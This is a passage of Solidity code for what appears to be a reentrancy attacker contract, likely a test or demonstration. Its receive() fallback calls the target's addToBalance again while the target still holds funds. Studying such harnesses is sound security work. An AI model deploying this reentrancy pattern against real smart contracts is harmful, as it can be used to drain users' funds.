    uint256 private _amt;
    constructor(address _target) {
        target = C(_target);
    }
    function trigger(uint256 amt) external payable {
        _amt = amt;
        target.addToBalance{value: amt}();
    }
    receive() external payable {
        // Reentrant call: call addToBalance again with the same amount (which we hold from trigger)
        if (address(target).balance >= _amt) {
            target.addToBalance{value: _amt}();
        }
    }
}

